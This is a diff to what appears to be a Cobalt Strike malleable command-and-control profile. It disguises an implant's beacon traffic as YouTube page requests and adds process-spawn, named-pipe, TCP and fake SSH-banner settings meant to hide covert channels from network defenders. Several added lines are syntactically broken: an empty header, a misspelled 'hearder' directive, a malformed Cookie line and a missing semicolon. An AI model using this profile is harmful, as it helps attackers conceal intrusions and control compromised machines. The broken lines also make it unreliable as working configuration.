@@ -6,12 +6,29 @@
 
 set sleeptime "1000";
 set jitter    "42";
-set maxdns    "255";
-set pipename "1790CPT"
-## Recommended Spawnto: armsvc, SearchIndexer, conhost, MpCopyAccelerator, SearchApp, userinit
-set spawnto "userinit.exe"
+set dns_idle "8.8.8.8";
+set maxdns    "245";
 set useragent "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko";
+set spawnto "userinit.exe"
 
+
+###SMB Options###
+#set pipename "ntsvcs##";
+#set pipename_stager "scerpc##";
+#set smb_frame_header "";
+
+###TCP Options###
+set tcp_port "8000";
+set tcp_frame_header "";
+
+###SSH options###
+set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
+
+#custom cert
+#https-certificate {
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
 
 
 ################################################
@@ -23,7 +40,7 @@ set useragent "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Ge
 ##    uri "/activity"
 ##    Headers (Sample)
 ##      Accept: */*
-##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
+##      Cookie: AGXVzq9TsOsr5VxnvrV6tp54aH8DIH6RG3ssV5tEuSSsrRMU6RDkZwH20OmQRPHIqAFZFfbDeXppcUfcI5jeYvPVd1VRFhaiTDKGR6OqNSW4qX3MfYVIzsalHKCgVV_4G9AojAqSx_pRKqA4S7dUvvc
 ##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
 ## Guidelines:
 ##    - Add customize HTTP headers to the HTTP traffic of your campaign
@@ -33,19 +50,21 @@ set useragent "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Ge
 
 http-get {
 
-    set uri "/watch?v=w5jwxrTqoEA&ab_channel=RushVEVO"; 
+    set uri "/watch?v=ARf7LKo-hnk"; 
 
     client {
 
         header "Accept" "*/*";
         header "Host" "www.youtube.com";
         header "Referer" "http://gds.google.com/";
+        header ""
         header "Accept-Encoding" "gzip, deflate";
 
 
         metadata {
             base64url;
-            header "Cookie";
+            prepend "__cfduid=";
+            header "Cookie"; "AGXVzq9TsOsr5VxnvrV6tp54aH8DIH6RG3ssV5tEuSSsrRMU6RDkZwH20OmQRPHIqAFZFfbDeXppcUfcI5jeYvPVd1VRFhaiTDKGR6OqNSW4qX3MfYVIzsalHKCgVV_4G9AojAqSx_pRKqA4S7dUvvc";
         }
     }
 
@@ -55,6 +74,7 @@ http-get {
         header "X-Frame-Options" "SAMEORIGIN";
         header "X-XSS Protection" "1; mode=block; report=https://www.google.com/appserve/security-bugs/log/youtube";
         header "Content-Encoding" "gzip";
+        hearder "X-Content-Type-Options:" "nosniff";
 
         output {
             print;
@@ -64,15 +84,17 @@ http-get {
 
 http-post {
     
-    set uri "/watch?v=CjCtwj5yJ_o&ab_channel=TheRealMcKenzies-Topic";
-    set verb "POST";
+    set uri "/watch?v=gG-sK9zu6S8&t=8s";
+    set verb "GET";
 
     client {
 
         header "Accept" "*/*";
-        header "Content-Type" "text/xml";
+        header "Content-Type" "text/html,application";
         header "X-Requested-With" "XMLHttpRequest";
         header "Host" "www.youtube.com";
+        header "Accept-Language" "en-US,en;q=0.5";
+        header "Connection: close"
 
         parameter "sz" "160x600";
         parameter "oe" "oe=ISO-8859-1;";
